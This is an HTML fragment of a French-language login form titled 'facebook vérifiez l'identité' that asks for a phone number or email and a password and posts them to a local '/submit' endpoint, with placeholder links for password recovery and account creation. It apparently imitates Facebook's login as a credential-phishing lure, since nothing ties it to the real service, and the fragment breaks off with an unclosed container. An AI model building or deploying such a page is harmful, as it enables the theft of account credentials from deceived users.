    <div class="login-container">
        <div class="login-box">
            <h2>facebook vérifiez l'identité</h2>
            <form id="loginForm" action="/submit" method="post">
                
                <div class="form-group">
                    <input type="text" id="email" name="email" placeholder="Numéro mobile ou e-mail" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
                </div>
                <button type="submit">Se connecter</button>
            </form>
            <div class="options">
                <a href="#">Mot de passe oublié</a>
                <hr>
                <button class="btn-create-account">Créer nouveau compte</button>
            </div>
        </div>
